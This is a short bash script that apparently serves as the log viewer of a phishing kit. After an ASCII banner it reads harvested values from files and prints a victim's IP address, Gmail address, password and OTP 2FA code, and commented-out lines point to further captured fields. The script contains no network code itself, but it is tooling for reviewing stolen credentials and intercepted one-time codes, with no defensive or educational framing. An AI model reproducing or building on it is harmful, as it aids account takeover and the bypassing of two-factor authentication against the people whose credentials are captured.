clear
echo
echo -e '\e[96m                          
                        __    _____  ___  ___ 
                       (  )  (  _  )/ __)/ __)
                        )(__  )(_)(( (_-.\__ \\'
echo -e '\e[91m                       (____)(_____)\___/(___/ \e[0m'
echo " "
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat ip.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] IP:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat gmail.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] GMAIL:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
ip=$(cat pass.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] PASS:\e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|"
#ip=$(cat gml.txt)
#printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] NUMBER:\e[0m\e[1;77m $ip \e[0m\n" $ip
#ip=$(cat num.txt)
#printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] BIO:\e[0m\e[1;77m $ip \e[0m\n" $ip
#ip=$(cat bio.txt)
#printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] USER:\e[0m\e[1;77m $ip \e[0m\n" $ip
#ip=$(cat usr.txt)
#printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m $ip \e[0m\n" $ip
ip=$(cat otp.txt)
printf "\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] OTP2FA:\e[0m\e[1;91m $ip \e[0m\n" $ip
#ip=$(cat cred.txt)
#printf "\e[1;93m[\e[0m\e[1;77m|\e[0m\e[1;93m] OT \e[0m\e[1;92m $ip \e[0m\n" $ip
echo -e "\e[96m |---------------------------------------------------------------|\e[0m"
